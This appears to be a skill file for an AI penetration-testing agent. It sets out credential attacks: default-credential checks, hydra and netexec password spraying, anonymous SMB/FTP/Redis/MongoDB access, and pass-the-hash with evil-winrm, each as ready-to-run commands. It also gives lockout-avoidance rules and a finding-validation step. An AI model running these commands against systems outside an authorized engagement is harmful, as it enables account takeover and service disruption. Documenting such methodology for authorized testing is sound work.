---
name: credential-attacks
description: Authentication attacks — credential spraying, brute force, pass-the-hash, default credentials. Maps to Hunter NET03.
allowed-tools: Read, Grep, Glob, Bash
---

# Credential Attack Skill

## When to Use
- When authentication services are discovered (SSH, SMB, RDP, FTP, databases)
- After user enumeration reveals valid usernames
- When testing for default or weak credentials

## Tool Chain

### 1. Default Credentials (always first)
    # Test service defaults from wordlist
    # Format: service:username:password
    cat hunter/wordlists/service-default-creds.txt

    # NetExec for multi-protocol default cred checks
    netexec smb TARGET -u admin -p admin
    netexec ssh TARGET -u root -p toor
    netexec mssql TARGET -u sa -p ''

### 2. Credential Spraying
    # Low and slow — max 4 threads to avoid lockouts
    hydra -L hunter/wordlists/common-users.txt -P hunter/wordlists/common-passwords.txt TARGET SERVICE -t 4
    hydra -L users.txt -p 'Password1' TARGET smb -t 4

    # NetExec spray (respects lockout policies)
    netexec smb TARGET -u users.txt -p 'Spring2026!' --continue-on-success

### 3. Null/Anonymous Access
    # SMB null session
    smbclient -L //TARGET -N
    netexec smb TARGET -u '' -p ''

    # FTP anonymous
    curl ftp://TARGET/ --user anonymous:anonymous

    # Redis unauthenticated
    ncat TARGET 6379 <<< "INFO"

    # MongoDB unauthenticated
    ncat TARGET 27017 <<< '{"isMaster": 1}'

### 4. Password Hash Attacks
    # Pass-the-hash (if NTLM hash obtained)
    netexec smb TARGET -u USER -H NTLM_HASH
    evil-winrm -i TARGET -u USER -H NTLM_HASH

## Rules
- **NEVER** exceed 4 concurrent threads for online attacks
- **ALWAYS** check password policy first (lockout threshold, duration)
- **STOP** spraying if accounts start locking out
- Log all valid credentials to $PROJECT_DIR/hunter/recon/valid-creds.txt

## Output
Document: service, valid credentials, access level, and recommended escalation paths.

## Validate & Promote

Findings from this skill are born `theoretical` (see the validation layer in the repo-root `CLAUDE.md`). They do NOT enter a report or external submission until promoted to `confirmed` with `scripts/validate-finding.sh`, after the independent check below.

- **Independent check for this class:** Confirm valid creds actually AUTHENTICATE to the service (login success) with a denied control for wrong creds; avoid lockouts.
- Only `confirmed` findings ship. `validated` = reproduced but not independently confirmed.

```bash
bash scripts/validate-finding.sh --project-dir "$PROJECT_DIR" --agent hunter \
  --id HUN-NNN --state confirmed --method manual-repro \
  --negative-control "<what you proved, and the control result>" --by hunter
```
